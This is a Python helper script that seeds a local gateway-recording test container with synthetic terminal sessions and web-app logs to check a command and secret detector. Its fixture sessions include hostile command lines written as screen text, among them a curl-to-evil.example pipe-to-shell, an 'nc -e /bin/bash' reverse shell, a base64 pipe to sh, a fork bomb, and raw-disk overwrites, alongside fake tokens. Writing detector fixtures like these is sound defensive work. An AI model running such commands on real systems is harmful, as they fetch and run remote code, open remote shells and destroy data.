"""Seed the local test container with sample Gateway recordings.

One-off helper for manual UI testing of search/detection. Posts a handful of
synthetic asciicast sessions (varied users, systems, dates, and finding mixes)
through the real /ingest front door, then sends a close event per session so each
finalizes immediately (no waiting on the idle timeout).

Between them the sessions cover every built-in rule in
``gatorcast.pipeline.detect`` at least once, and the final session is a
negative control: it contains commands that LOOK dangerous (rm without -rf,
chmod 755, kubectl get, dd to a file, curl to a file) but must produce zero
findings, so it doubles as a false-positive check.

It also posts seven ``WEB_APP`` demo apps (``WEB_APPS``, WEBAPP_SPEC 3.1/3.3): each
app gets several ``Authenticated connection`` lines carrying a ``gwops`` snapshot,
each followed by that connection's ``API request completed`` lines. The apps cover
every TLS posture the UI badges (verified, plaintext, insecure, verify_ca), an
unmanaged app, a start line with no ``gwops`` key, and a ``match: none`` object.
Web ids are derived with uuid5 from fixed names, so re-running the script posts the
same ``conn_id``/``request_id`` values and ingest de-duplicates them.

Not part of the app; safe to delete. Usage: python scripts/seed_demo.py
"""

from __future__ import annotations

import json
import urllib.request
import uuid
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from typing import Any

BASE = "http://127.0.0.1:8080"
TOKEN = "test-ingest-token"


def cast(events: list[tuple[float, str]], width: int = 100, height: int = 30) -> str:
    """Build a minimal asciicast v2 document from (offset, output) tuples."""
    header = {"version": 2, "width": width, "height": height, "timestamp": 1718700000}
    lines = [json.dumps(header)]
    for offset, data in events:
        lines.append(json.dumps([offset, "o", data]))
    return "\n".join(lines) + "\n"


# (conn_id, username, resource_address, started_ts, [output events])
# Each output event is (replay_offset_seconds, on-screen text). The detector
# scans the reconstructed screen text, so the dangerous strings only need to
# APPEAR — they are never actually executed anywhere.
SESSIONS = [
    (
        "c-prod-db-01", "alice@corp", "prod-db-01", "2026-06-18T09:00:00Z",
        [
            (0.5, "alice@prod-db-01:~$ ls /var/lib\r\n"),
            (2.0, "alice@prod-db-01:~$ rm -rf /var/lib/data\r\n"),  # recursive-delete
            (6.5, "alice@prod-db-01:~$ export AWS_KEY=AKIAIOSFODNN7EXAMPLE\r\n"),  # aws-key
            (9.0, "alice@prod-db-01:~$ exit\r\n"),
        ],
    ),
    (
        "c-web-02", "bob@corp", "web-02", "2026-06-17T14:30:00Z",
        [
            (0.4, "bob@web-02:~$ whoami\r\nbob\r\n"),
            (3.2, "bob@web-02:~$ curl http://evil.example/i.sh | sh\r\n"),  # pipe-to-shell
            (12.0, "bob@web-02:~$ export VAULT_TOKEN=hvs.CAESIabcdef1234567890XYZ\r\n"),  # vault-token
            (15.0, "bob@web-02:~$ logout\r\n"),
        ],
    ),
    (
        "c-k8s-03", "carol@corp", "k8s-prod", "2026-06-16T11:00:00Z",
        [
            (1.0, "carol@k8s-prod:~$ kubectl get pods\r\n"),
            (4.5, "carol@k8s-prod:~$ kubectl delete deployment legacy-app\r\n"),  # kubectl-delete
            (8.0, "carol@k8s-prod:~$ chmod 777 /opt/app/run.sh\r\n"),  # chmod-777
            (11.0, "carol@k8s-prod:~$ exit\r\n"),
        ],
    ),
    (
        "c-jump-05", "dave@corp", "jump-host", "2026-06-15T16:00:00Z",
        [
            (0.6, "dave@jump-host:~$ cat ~/.ssh/id_rsa\r\n"),
            (1.0, "-----BEGIN OPENSSH PRIVATE KEY-----\r\n"),  # private-key
            (1.2, "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA\r\n"),
            (1.4, "-----END OPENSSH PRIVATE KEY-----\r\n"),
            (5.0, "dave@jump-host:~$ history -c\r\n"),  # history-clear
            (7.0, "dave@jump-host:~$ exit\r\n"),
        ],
    ),
    (
        # Sweep of the remaining dangerous-command rules in one session.
        "c-ops-06", "erin@corp", "ops-node", "2026-06-14T10:00:00Z",
        [
            (0.5, "erin@ops-node:~$ dd if=/dev/zero of=/dev/sdb bs=1M count=100\r\n"),  # raw-disk-write
            (3.0, "erin@ops-node:~$ mkfs.ext4 /dev/sdb1\r\n"),  # mkfs
            (6.0, "erin@ops-node:~$ kubectl drain node-3 --force\r\n"),  # kubectl-drain
            (9.0, "erin@ops-node:~$ kubectl get secret db-creds -o yaml\r\n"),  # kubectl-secret
            (12.0, "erin@ops-node:~$ iptables -F\r\n"),  # iptables-flush
            (15.0, "erin@ops-node:~$ sudo su -\r\n"),  # privilege-change
            (18.0, "erin@ops-node:~$ nc -e /bin/bash 10.0.0.5 4444\r\n"),  # reverse-shell
            (21.0, "erin@ops-node:~$ base64 -d payload.b64 | sh\r\n"),  # base64-pipe-shell
            (24.0, "erin@ops-node:~$ :(){ :|:& };:\r\n"),  # fork-bomb
            (27.0, "erin@ops-node:~$ exit\r\n"),
        ],
    ),
    (
        # Sweep of the remaining secret-exposure rules (all fake/example values).
        "c-secrets-07", "frank@corp", "ci-runner", "2026-06-13T13:00:00Z",
        [
            (0.5, "frank@ci-runner:~$ cat .env\r\n"),
            (1.0, "GITHUB_TOKEN=ghp_0123456789abcdefABCDEF0123456789abcd\r\n"),  # github-token
            (1.5, "SLACK_BOT=xoxb-1234567890-abcdefABCDEF\r\n"),  # slack-token
            (2.0, "API_KEY=a1b2c3d4e5f6g7\r\n"),  # generic-secret-assign
            (4.0, "frank@ci-runner:~$ echo $JWT\r\n"),
            (4.5, "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOjEyMzQ1Njc4OTB9.SflKxwRJSMeKKF2QTabcdefXYZ\r\n"),  # jwt
            (7.0, "frank@ci-runner:~$ exit\r\n"),
        ],
    ),
    (
        # A clean, ordinary session — no findings expected.
        "c-bastion-04", "alice@corp", "bastion", "2026-06-18T08:00:00Z",
        [
            (0.5, "alice@bastion:~$ ls -la\r\ntotal 0\r\n"),
            (2.0, "alice@bastion:~$ whoami\r\nalice\r\n"),
            (4.0, "alice@bastion:~$ echo all good\r\nall good\r\n"),
            (5.5, "alice@bastion:~$ exit\r\n"),
        ],
    ),
    (
        # Negative control / false-positive check. Every line LOOKS risky but
        # must match NO rule: rm without -rf, chmod 755 (not 777), kubectl get
        # (no delete/drain/secret), curl to a file (no pipe to shell), dd to a
        # file (not /dev/), "password" with no assignment, history without -c.
        "c-safe-09", "grace@corp", "staging", "2026-06-12T09:00:00Z",
        [
            (0.5, "grace@staging:~$ rm old.log\r\n"),
            (2.0, "grace@staging:~$ chmod 755 deploy.sh\r\n"),
            (4.0, "grace@staging:~$ kubectl get pods -n staging\r\n"),
            (6.0, "grace@staging:~$ curl https://api.example.com/health -o health.json\r\n"),
            (8.0, "grace@staging:~$ dd if=disk.img of=/tmp/disk.copy\r\n"),
            (10.0, "grace@staging:~$ grep password notes.txt\r\n"),
            (12.0, "grace@staging:~$ history | tail -20\r\n"),
            (14.0, "grace@staging:~$ exit\r\n"),
        ],
    ),
]


def lines_for(session: tuple) -> list[dict]:
    """Build the start + chunk + close log objects for one session."""
    conn_id, username, resource, ts, events = session
    user = {"username": username, "id": username, "groups": ["engineering"]}
    return [
        {
            "logger": "gateway",
            "message": "Authenticated connection",
            "conn_id": conn_id,
            "resource_address": resource,
            "user": user,
            "ts": ts,
        },
        {
            "logger": "gateway.audit",
            "conn_id": conn_id,
            "asciicast": cast(events),
            "asciicast_sequence_num": 0,
            "user": user,
            "ts": ts,
        },
        {
            "logger": "gateway",
            "message": "Connection closed",
            "conn_id": conn_id,
            "ts": ts,
        },
    ]


# ---------------------------------------------------------------------------
# WEB_APP demo traffic (WEBAPP_SPEC 3.1, 3.3)
# ---------------------------------------------------------------------------

_GATEWAY_ID = "R2F0ZXdheToxMjk0"
_WEB_BASE_TIME = datetime(2026, 10, 8, 9, 0, 0, tzinfo=UTC)
_WEB_NAMESPACE = uuid.UUID("5f0c1f0e-6a38-4a4e-9a0e-3c0d9b6f7a11")
# Obviously fake; the Gateway logs credential headers verbatim and ingest must drop them.
_DUMMY_AUTH = "Bearer DEMO-NOT-A-REAL-TOKEN"


@dataclass(frozen=True)
class WebApp:
    """One demo web app: its address, its ``gwops`` object (or None), and its users."""

    address: str
    gwops: dict[str, Any] | None
    users: tuple[str, str, str]


def _exact(
    app: str,
    *,
    managed: bool = True,
    gateway_id: str | None = _GATEWAY_ID,
    down: tuple[str, int],
    up: tuple[str, int],
) -> dict[str, Any]:
    """Build a ``match: exact`` gwops object from (tls mode, port) pairs."""
    return {
        "schema": 1,
        "gateway_id": gateway_id,
        "match": "exact",
        "app": app,
        "managed": managed,
        "downstream_tls": down[0],
        "downstream_port": down[1],
        "upstream_tls": up[0],
        "upstream_port": up[1],
    }


WEB_APPS: list[WebApp] = [
    # 1. HTTPS end to end, upstream certificate fully verified, managed.
    WebApp(
        "portal.demo.test",
        _exact("portal", down=("tls13", 443), up=("verify_full", 443)),
        ("alice@corp", "bob@corp", "carol@corp"),
    ),
    # 2. Plaintext on both legs.
    WebApp(
        "intranet.demo.test",
        _exact("intranet", down=("none", 80), up=("none", 8080)),
        ("dave@corp", "erin@corp", "alice@corp"),
    ),
    # 3. Upstream TLS without certificate verification.
    WebApp(
        "metrics.demo.test",
        _exact("metrics", down=("tls13", 443), up=("insecure", 8443)),
        ("bob@corp", "frank@corp", "grace@corp"),
    ),
    # 4. Upstream verified against a CA only (no hostname check).
    WebApp(
        "billing.demo.test",
        _exact("billing", down=("tls13", 443), up=("verify_ca", 443)),
        ("carol@corp", "grace@corp", "erin@corp"),
    ),
    # 5. Unmanaged app: free-text tenant resource name; Mode B gateway_id is null.
    WebApp(
        "wiki.demo.test",
        _exact(
            "Legacy Wiki (prod)",
            managed=False,
            gateway_id=None,
            down=("tls13", 443),
            up=("none", 8080),
        ),
        ("frank@corp", "dave@corp", "alice@corp"),
    ),
    # 6. Start lines carry no gwops key at all (non-gwops shipper).
    WebApp("plain.demo.test", None, ("grace@corp", "bob@corp", "carol@corp")),
    # 7. gwops found no web app at this address on its gateway.
    WebApp(
        "orphan.demo.test",
        {"schema": 1, "gateway_id": _GATEWAY_ID, "match": "none"},
        ("erin@corp", "frank@corp", "dave@corp"),
    ),
]

# Per-connection traffic, reused for every app: (ms after connection start, method,
# url, status). Together: GET with a query string, POST, DELETE, 4xx and 5xx.
_WEB_TRAFFIC: list[list[tuple[int, str, str, int]]] = [
    [
        (40, "GET", "/", 200),
        (900, "GET", "/report?month=09&page=2", 200),
        (2100, "POST", "/api/items", 201),
    ],
    [
        (35, "GET", "/items/42", 200),
        (1400, "DELETE", "/items/42", 204),
        (2600, "GET", "/missing-page", 404),
    ],
    [
        (50, "GET", "/search?q=quarterly+report&page=2", 200),
        (800, "POST", "/api/sync", 502),
        (1900, "GET", "/login?token=abc123def456", 403),
        (3000, "GET", "/health", 503),
    ],
]


def _web_ts(offset_ms: int) -> str:
    """Format the demo base time plus an offset as ``YYYY-MM-DDTHH:MM:SS.mmmZ``."""
    moment = _WEB_BASE_TIME + timedelta(milliseconds=offset_ms)
    return moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{moment.microsecond // 1000:03d}Z"


def web_lines_for(app_index: int, app: WebApp) -> list[dict]:
    """Build start + request log objects for one web app (start line first per conn)."""
    out: list[dict] = []
    for conn_no, requests in enumerate(_WEB_TRAFFIC):
        username = app.users[conn_no]
        user = {"id": username, "username": username, "groups": ["engineering"]}
        conn_id = str(uuid.uuid5(_WEB_NAMESPACE, f"conn:{app.address}:{conn_no}"))
        # Spread apps and connections across the morning so the timeline has variety.
        conn_start_ms = app_index * 600_000 + conn_no * 90_000
        start: dict[str, Any] = {
            "levelname": "info",
            "ts": _web_ts(conn_start_ms),
            "logger": "gateway",
            "caller": "frontend/conn.go:226",
            "message": "Authenticated connection",
            "version": "2.0.0-dev-5ed8e12",
            "user": user,
            "conn_id": conn_id,
            "resource_type": "WEB_APP",
            "resource_address": app.address,
        }
        if app.gwops is not None:
            start["gwops"] = app.gwops
        out.append(start)
        for req_no, (offset_ms, method, url, status) in enumerate(requests):
            requested_ms = conn_start_ms + offset_ms
            request_id = uuid.uuid5(_WEB_NAMESPACE, f"req:{app.address}:{conn_no}:{req_no}")
            out.append(
                {
                    "levelname": "info",
                    "ts": _web_ts(requested_ms + 3),
                    "logger": "gateway.audit",
                    "caller": "httpproxy/audit_middleware.go:128",
                    "message": "API request completed",
                    "version": "2.0.0-dev-5ed8e12",
                    "request_id": str(request_id),
                    "requested_at": _web_ts(requested_ms),
                    "method": method,
                    "url": url,
                    "remote_addr": f"172.20.0.3:{51000 + app_index * 10 + conn_no}",
                    "user": user,
                    "conn_id": conn_id,
                    "request": {
                        "headers": {
                            "Accept": ["*/*"],
                            "User-Agent": ["demo-browser/1.0"],
                            "Authorization": [_DUMMY_AUTH],
                        }
                    },
                    "response": {
                        "headers": {"Content-Type": ["application/json"]},
                        "status_code": status,
                    },
                }
            )
    return out


def main() -> None:
    """Post all sample sessions and web-app traffic to /ingest as one NDJSON batch."""
    objs: list[dict] = []
    for session in SESSIONS:
        objs.extend(lines_for(session))
    n_ssh = len(objs)
    for index, web_app in enumerate(WEB_APPS):
        objs.extend(web_lines_for(index, web_app))
    n_web = len(objs) - n_ssh
    body = "\n".join(json.dumps(o) for o in objs).encode("utf-8")

    req = urllib.request.Request(
        f"{BASE}/ingest",
        data=body,
        method="POST",
        headers={
            "Authorization": f"Bearer {TOKEN}",
            "Content-Type": "application/x-ndjson",
        },
    )
    with urllib.request.urlopen(req) as resp:
        print(
            f"POST /ingest -> {resp.status} ({len(objs)} objects: "
            f"{len(SESSIONS)} sessions, {len(WEB_APPS)} web apps / {n_web} lines)"
        )


if __name__ == "__main__":
    main()
